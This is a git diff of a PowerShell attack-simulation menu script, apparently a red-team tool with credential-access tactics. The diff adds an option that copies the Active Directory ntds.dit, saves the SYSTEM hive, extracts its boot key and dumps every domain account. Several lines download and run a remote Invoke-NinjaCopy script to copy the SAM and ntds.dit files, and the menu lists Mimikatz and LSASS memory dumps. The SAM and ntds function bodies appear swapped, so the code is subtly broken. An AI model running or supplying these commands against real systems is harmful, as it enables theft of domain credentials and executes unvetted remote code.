@@ -319,7 +319,7 @@ Function sub_DefenseEvasion_DisableWindowsDefenderAV() {
 #endregion
 #region Credentials
 Function Main_Credentials() {
-    $subTactics = @("Mimikatz - Logonpasswords", "PowerShell Mimikatz", "PowerShell Encoded Mimikatz", "Capture Lsass Memory Dump", "Capture Lsass Memory Dump (Prodump)", "Copy Local SAM File (via Invoke-NinjaCopy)","Back to Main")
+    $subTactics = @("Mimikatz - Logonpasswords", "PowerShell Mimikatz", "PowerShell Encoded Mimikatz", "Capture Lsass Memory Dump", "Capture Lsass Memory Dump (Prodump)", "Copy Local SAM File (via Invoke-NinjaCopy)", "Copy Local ntds File (via Invoke-NinjaCopy)", "Back to Main")
     switch (Write-Menu -Header "Credential Access Tactics" -HeaderColor Green -Items $subTactics) {
         "PowerShell Mimikatz" {sub_Credentials_Mimikatz}   
         "PowerShell Encoded Mimikatz" {sub_Credentials_EncodedMimikatz}  
@@ -327,15 +327,24 @@ Function Main_Credentials() {
         "Capture Lsass Memory Dump" {sub_Credentials_LsassMemoryDump} 
         "Capture Lsass Memory Dump (Prodump)" {sub_Credentials_LsassMemoryProcDump} 
         "Copy Local SAM File (via Invoke-NinjaCopy)" {sub_Credentials_CopySamFile} 
+	"Copy Local ntds File (via Invoke-NinjaCopy)" {sub_Credentials_CopyNtdsFile}
         "Back to Main"{Main}
     }
     Main_Credentials
 }
 
 Function sub_Credentials_CopySamFile() {
-    #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/basti1-b/scripts/master/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\Windows\ntds\ntds.dit" -LocalDestination "c:\ntds.dit" -verbose
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/basti1-b/scripts/master/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam" -verbose
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/basti1-b/scripts/master/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\Windows\ntds\ntds.dit" -LocalDestination "c:\ntds.dit" -verbose
 }
+
+Function sub_Credentials_CopyNtdsFile() {
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/basti1-b/scripts/master/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam" -verbose
+    reg SAVE HKLM\SYSTEM C:\SYS
+    $key = Get-BootKey -SystemHiveFilePath C:\SYS
+    esentutl.exe /p c:\ntds.dit /!10240 /8 /o
+    Get-ADDBAccount -All -BootKey $key -DBPath c:\ntds.dit
+}
+
 Function sub_Credentials_LsassMemoryProcDump() {
 
     $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".exe")
